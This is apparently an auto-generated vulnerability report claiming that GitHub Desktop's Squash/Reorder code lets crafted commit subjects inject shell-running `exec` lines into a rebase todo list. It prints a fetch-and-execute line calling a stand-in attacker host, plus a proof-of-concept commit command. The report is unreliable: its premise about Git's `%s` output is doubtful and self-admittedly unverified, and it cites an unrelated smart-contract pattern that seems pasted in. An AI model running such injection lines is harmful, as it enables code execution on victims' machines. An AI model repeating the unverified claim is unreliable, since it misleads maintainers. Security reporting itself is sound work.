## Title
Attacker-controlled commit subjects containing embedded newlines allow interactive-rebase todo-list injection during Squash/Reorder, leading to arbitrary command execution - ([File: app/src/lib/git/squash.ts])

### Summary
GitHub Desktop's "Squash" and "Reorder" multi-commit operations build a Git interactive-rebase "todo list" by directly interpolating each commit's `summary` field into plain-text lines (`pick <sha> <summary>`), then feed that file to `git rebase -i` via a `sequence.editor` trick. The `summary` value is loaded from `git log --format=%s` output and is trusted to always be a single line. Git's pretty-format `%s` (subject) is only guaranteed to be single-line when the commit message has a blank line separating subject from body; if a crafted commit message has no such blank line, `%s` returns the raw multi-line text verbatim, including embedded newlines. This mirrors the LineaRollup pattern of trusting unvalidated loaded data (`dataParentHash`/`shnarf`) to build sequential state: here the unvalidated `commit.summary` is spliced into a sequence of trusted rebase-todo lines without checking it cannot introduce new, attacker-controlled lines.

### Finding Description
`createLogParser` in [1](#0-0)  splits `git log` output only on NUL (`\0`) separators between fields, so embedded `\n` characters inside a field are preserved as-is. `getCommits` requests the subject via the `%s` format placeholder and stores it verbatim as `commit.summary`, with no newline stripping or validation: [2](#0-1) .

`reorder()` and `squash()` then write each commit directly into a rebase-todo file using template strings such as `` `pick ${commit.sha} ${commit.summary}\n` `` and `` `squash ${commit.sha} ${commit.summary}\n` ``, with no check that `commit.summary` is a single line: [3](#0-2) [4](#0-3) .

That generated file is then substituted as the interactive-rebase todo list via `rebaseInteractive`, which sets `sequence.editor=cat "<path>" >` so Git treats every line in the file as a rebase todo instruction: [5](#0-4) .

If an attacker crafts a commit whose message has no blank line (so `%s` returns the entire multi-line message unmodified), e.g.:
```
Fix typo
exec curl http://attacker/x.sh | sh
```
then the line written to the generated todo file becomes:
```
pick <sha> Fix typo
exec curl http://attacker/x.sh | sh
```
`exec` is a legitimate Git interactive-rebase todo command that runs its argument through the shell during the rebase. No existing guard rejects this: `appendFile` performs no sanitization, and Git itself has no reason to reject extra todo lines that were "authored" by Desktop's own generated file.

### Impact Explanation
This allows arbitrary command execution on the victim's machine, in the context of the user's shell, triggered simply by the victim performing a normal, everyday Desktop action (selecting commits to Squash or Reorder) on a branch that contains an attacker-crafted commit — e.g. from a cloned/forked repository, a fetched branch, or a commit cherry-picked/pulled from an untrusted remote. This satisfies the "code execution" and "silent corruption of what the user commits" impact classes: the rebase silently proceeds with attacker-injected instructions the user never approved, and can execute code without any additional prompts, hooks, or explicit confirmation dialog referencing the injected command.

### Likelihood Explanation
Likelihood is moderate-to-high: it requires only that the victim have a commit with a maliciously-formatted subject line in their history (trivially achievable by an attacker who controls any commit the victim will fetch/clone/pull) and that the victim invoke Squash or Reorder on a range of commits including it — both very common Desktop operations. The exact behavior of `%s` producing multi-line output is a documented Git subtlety (subject = text up to first blank line; if no blank line exists, the entire message is returned) rather than something I could directly execute/verify in this environment, so this should be validated with a live repro before being treated as fully confirmed.

### Recommendation
- Never interpolate untrusted values (commit summaries, branch names, commit messages) directly into a generated rebase-todo file.
- Before writing `commit.summary` into a todo line, strip/reject embedded control characters and newlines (e.g. `summary.replace(/[\r\n]/g, ' ')`), or write the todo using a robust escaping/quoting scheme that Git's sequencer cannot reinterpret as new lines.
- Add defense-in-depth validation on `Commit`/`CommitOneLine` construction (in `app/src/models/commit.ts`) to guarantee `summary` cannot contain `\n`, since downstream consumers assume single-line invariants.
- Add regression tests (similar to `app/test/unit/git/squash-test.ts`) using commit summaries containing embedded newlines/`exec` lines to confirm no extra todo lines are ever produced.

### Proof of Concept
1. In a repository, create a commit with a message lacking a blank line, e.g. via `git commit --allow-empty -m "$(printf 'Fix bug\nexec touch /tmp/pwned')"`. Because there is no blank line, `git log --format=%s` for this commit returns the full two-line string.
2. Have a victim clone/fetch this repository into GitHub Desktop.
3. In Desktop, select this commit along with at least one other commit and invoke "Squash" or "Reorder" via the multi-commit operation UI (`app/src/lib/git/squash.ts` / `app/src/lib/git/reorder.ts`).
4. Desktop writes the generated todo file, appending `pick <sha> Fix bug\nexec touch /tmp/pwned\n` verbatim as shown at [6](#0-5) .
5. `rebaseInteractive` runs `git -c sequence.editor='cat "<todo>" >' rebase -i <ref>` ( [7](#0-6) ), causing Git to execute the injected `exec touch /tmp/pwned` line as part of the interactive rebase, demonstrating arbitrary command execution.
